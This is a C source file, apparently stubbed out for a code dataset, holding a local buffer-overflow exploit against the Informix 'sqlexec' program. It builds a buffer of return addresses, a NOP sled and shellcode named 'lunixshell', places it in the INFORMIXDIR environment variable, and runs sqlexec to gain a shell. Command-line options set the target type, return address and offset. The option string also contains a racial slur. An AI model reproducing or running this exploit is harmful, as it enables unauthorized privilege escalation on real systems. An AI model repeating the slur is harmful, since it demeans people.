
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {int retadd; int offset; } ;


 int BUFFERSIZE ;
 int EOF ;
 void* atoi (int ) ;
 int execl (char*,char*,int *) ;
 int exit (int) ;
 int getopt (int,char**,char*) ;
 int * lunixshell ;
 char* malloc (int) ;
 int optarg ;
 int printf (char*,...) ;
 int setenv (char*,char*,int) ;
 int strlen (int *) ;
 int strtoul (int ,int *,int) ;
 TYPE_1__* targets ;
 size_t type ;
 int usage (char*) ;

int main(int argc, char *argv[])
{
 int i, c, os;
 long *addr_ptr;
 char *buffer, *ptr, *osptr;







     if(argc < 3)
       {
         usage(argv[0]);
         return 1;
       }

      while(( c = getopt (argc, argv, "t:r:o:nigger"))!= EOF){

      switch (c)
        {

         case 't':
            type = atoi(optarg);
            break;

         case 'r':
            targets[type].retadd = strtoul(optarg, ((void*)0), 16);
            break;

         case 'o':
            targets[type].offset = atoi(optarg);
            break;

        default:
          usage(argv[0]);
          return 1;
        }
   }


 printf("[<>] - Stack pointer: 0x%x\n", targets[type].retadd);
 printf("[<>] - Offset: 0x%x\n", targets[type].offset);
 printf("[<>] - Return addr: 0x%x\n", targets[type].retadd - targets[type].offset);



 if(!(buffer = malloc(BUFFERSIZE))) {
  printf("Couldn't allocate memory.\n");
  exit(-1);
 }


 ptr = buffer;
 addr_ptr = (long *)ptr;
 for(i=0; i<BUFFERSIZE; i+=4)
  *(addr_ptr++) = targets[type].retadd - targets[type].offset;


 for(i=0; i<BUFFERSIZE/2; i++)
  buffer[i] = '\x90';


 ptr = buffer + ((BUFFERSIZE/2) - (strlen(lunixshell)/2));
 for(i=0; i<strlen(lunixshell); i++)
  *(ptr++) = lunixshell[i];




 buffer[BUFFERSIZE-1] = 0;
      setenv("INFORMIXDIR", buffer, 1);
 execl("./sqlexec", "sqlexec", ((void*)0));
 return 0;
}
